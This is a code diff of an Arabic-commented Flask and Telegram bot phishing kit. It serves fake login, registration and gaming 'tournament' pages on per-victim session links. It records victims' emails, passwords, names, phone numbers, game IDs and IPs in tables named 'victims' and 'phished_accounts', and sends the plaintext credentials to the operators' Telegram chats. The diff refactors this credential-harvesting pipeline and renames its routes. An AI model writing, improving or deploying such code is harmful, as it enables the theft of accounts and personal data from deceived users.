@@ -4,8 +4,8 @@ import json
 import sqlite3
 import secrets
 import threading
-import requests
 import asyncio
+import logging
 from datetime import datetime
 from flask import Flask, request, render_template, redirect, jsonify
 from telegram import Bot
@@ -19,6 +19,9 @@ BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
 if not TELEGRAM_TOKEN:
     raise ValueError("TELEGRAM_TOKEN not set")
 
+if not ADMIN_IDS:
+    logging.warning("ADMIN_IDS فارغ! لن تُرسل أي رسائل.")
+
 # ========== Flask ==========
 app = Flask(__name__, template_folder='.')
 
@@ -28,9 +31,10 @@ DB_PATH = "data.db"
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
+    # جدول الضحايا الرئيسي
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
-        session_id TEXT UNIQUE,
+        session_id TEXT,
         step TEXT,
         full_name TEXT,
         phone_code TEXT,
@@ -41,9 +45,11 @@ def init_db():
         user_agent TEXT,
         timestamp TEXT
     )''')
+    # جدول الحسابات (مُحدّث بعمود full_name)
     c.execute('''CREATE TABLE IF NOT EXISTS phished_accounts (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         session_id TEXT,
+        full_name TEXT,
         email TEXT,
         password TEXT,
         ip TEXT,
@@ -54,32 +60,61 @@ def init_db():
     conn.close()
 
 def send_to_telegram(message):
+    if not ADMIN_IDS:
+        print("[!] لا يوجد ADMIN_IDS لإرسال الرسالة!")
+        return False
     try:
         bot = Bot(token=TELEGRAM_TOKEN)
         for admin_id in ADMIN_IDS:
             bot.send_message(chat_id=admin_id, text=message, parse_mode='Markdown')
-        print(f"[✓] تم إرسال الرسالة: {message[:50]}...")
+        print(f"[✓] تم الإرسال لـ {len(ADMIN_IDS)} أدمن")
+        return True
     except Exception as e:
         print(f"[!] خطأ في الإرسال: {e}")
+        return False
+
+def save_phished_account(session_id, full_name, email, password, ip, ua):
+    """دالة موحدة لحفظ بيانات إنشاء الحساب"""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''INSERT INTO phished_accounts (session_id, full_name, email, password, ip, user_agent, timestamp)
+                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
+              (session_id, full_name, email, password, ip, ua, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    
+    msg = (
+        f"📝 **بيانات إنشاء حساب جديد!**\n"
+        f"🆔 الجلسة: `{session_id}`\n"
+        f"👤 الاسم: `{full_name or 'غير مدخل'}`\n"
+        f"📧 البريد: `{email}`\n"
+        f"🔑 كلمة المرور: `{password}`\n"
+        f"🌐 IP: `{ip}`\n"
+        f"📱 المتصفح: `{ua}`\n"
+        f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    return send_to_telegram(msg)
 
 def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''INSERT OR REPLACE INTO victims 
+    c.execute('''INSERT INTO victims 
                  (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, user_agent, timestamp)
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
               (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
     conn.commit()
     
-    # البحث عن بيانات تسجيل الدخول المرتبطة بنفس session_id
-    c.execute("SELECT email, password FROM phished_accounts WHERE session_id = ? ORDER BY id DESC LIMIT 1", (session_id,))
+    # البحث عن بيانات إنشاء الحساب المرتبطة بنفس session_id
+    c.execute("SELECT full_name, email, password FROM phished_accounts WHERE session_id = ? ORDER BY id DESC LIMIT 1", (session_id,))
     login_data = c.fetchone()
     conn.close()
     
-    login_email = login_data[0] if login_data else "غير موجود"
-    login_password = login_data[1] if login_data else "غير موجود"
+    if login_data:
+        acc_name, acc_email, acc_pass = login_data
+    else:
+        acc_name, acc_email, acc_pass = "غير موجود", "غير موجود", "غير موجود"
     
-    send_to_telegram(
+    msg = (
         f"🎯 **بيانات البطولة!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
         f"👤 الاسم: `{full_name}`\n"
@@ -89,28 +124,12 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
         f"🌐 IP: `{ip}`\n"
         f"📱 المتصفح: `{ua}`\n"
         f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n\n"
-        f"🔐 **بيانات تسجيل الدخول:**\n"
-        f"📧 البريد: `{login_email}`\n"
-        f"🔑 كلمة المرور: `{login_password}`"
+        f"🔐 **بيانات إنشاء الحساب المرتبطة:**\n"
+        f"👤 الاسم: `{acc_name}`\n"
+        f"📧 البريد: `{acc_email}`\n"
+        f"🔑 كلمة المرور: `{acc_pass}`"
     )
-
-def save_phished_account(session_id, email, password, ip, ua):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''INSERT INTO phished_accounts (session_id, email, password, ip, user_agent, timestamp)
-                 VALUES (?, ?, ?, ?, ?, ?)''',
-              (session_id, email, password, ip, ua, datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-    send_to_telegram(
-        f"📝 **بيانات إنشاء حساب!**\n"
-        f"🆔 الجلسة: `{session_id}`\n"
-        f"📧 البريد: `{email}`\n"
-        f"🔑 كلمة المرور: `{password}`\n"
-        f"🌐 IP: `{ip}`\n"
-        f"📱 المتصفح: `{ua}`\n"
-        f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}"
-    )
+    send_to_telegram(msg)
 
 # ========== الصفحات ==========
 @app.route('/')
@@ -121,18 +140,20 @@ def home():
 def health():
     return "OK", 200
 
-@app.route('/p/<session_id>', methods=['GET', 'POST'])
+# ✅ تغيير المسارات لتجنب التضارب
+@app.route('/login/<session_id>', methods=['GET', 'POST'])
 def login_page(session_id):
     if request.method == 'POST':
         email = request.form.get('email', '').strip()
         password = request.form.get('password', '').strip()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        save_phished_account(session_id, email, password, ip, ua)
-        return redirect(f'/t/{session_id}')
+        # تسجيل الدخول لا يحتوي على full_name
+        save_phished_account(session_id, "", email, password, ip, ua)
+        return redirect(f'/tournament/{session_id}')
     return render_template('login.html', session_id=session_id)
 
-@app.route('/<session_id>', methods=['GET', 'POST'])
+@app.route('/register/<session_id>', methods=['GET', 'POST'])
 def register_page(session_id):
     if request.method == 'POST':
         full_name = request.form.get('full_name', '').strip()
@@ -140,27 +161,13 @@ def register_page(session_id):
         password = request.form.get('password', '').strip()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('''INSERT INTO phished_accounts (session_id, email, password, ip, user_agent, timestamp)
-                     VALUES (?, ?, ?, ?, ?, ?)''',
-                  (session_id, email, password, ip, ua, datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-        send_to_telegram(
-            f"📝 **بيانات إنشاء حساب!**\n"
-            f"🆔 الجلسة: `{session_id}`\n"
-            f"👤 الاسم: `{full_name}`\n"
-            f"📧 البريد: `{email}`\n"
-            f"🔑 كلمة المرور: `{password}`\n"
-            f"🌐 IP: `{ip}`\n"
-            f"📱 المتصفح: `{ua}`\n"
-            f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}"
-        )
-        return redirect(f'/t/{session_id}')
+        
+        # ✅ استخدام الدالة الموحدة مع full_name
+        save_phished_account(session_id, full_name, email, password, ip, ua)
+        return redirect(f'/tournament/{session_id}')
     return render_template('register.html', session_id=session_id)
 
-@app.route('/t/<session_id>', methods=['GET', 'POST'])
+@app.route('/tournament/<session_id>', methods=['GET', 'POST'])
 def tournament_page(session_id):
     if request.method == 'POST':
         full_name = request.form.get('full_name', '').strip()
@@ -176,7 +183,7 @@ def tournament_page(session_id):
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    data = request.json
+    data = request.json or {}
     session_id = data.get('session_id')
     full_name = data.get('full_name', '')
     phone_code = data.get('phone_code', '')
@@ -206,7 +213,8 @@ async def generate_link(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
     session_id = secrets.token_urlsafe(8)
-    link = f"{BASE_URL}/{session_id}"
+    # ✅ تحديث الروابط للمسارات الجديدة
+    link = f"{BASE_URL}/register/{session_id}"
     await update.message.reply_text(
         f"🔗 **رابط جديد**\n\n"
         f"🆔 الجلسة: `{session_id}`\n"
@@ -243,8 +251,8 @@ async def stats(update, context):
     conn.close()
     await update.message.reply_text(
         f"📊 **إحصائيات**\n\n"
-        f"👤 الإجمالي الأول: `{total_victims}`\n"
-        f"🔐 الإجمالي الثاني: `{total_accounts}`",
+        f"👤 إجمالي البطولات: `{total_victims}`\n"
+        f"🔐 إجمالي الحسابات: `{total_accounts}`",
         parse_mode='Markdown'
     )
 
@@ -275,3 +283,4 @@ if __name__ == "__main__":
     
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
+    
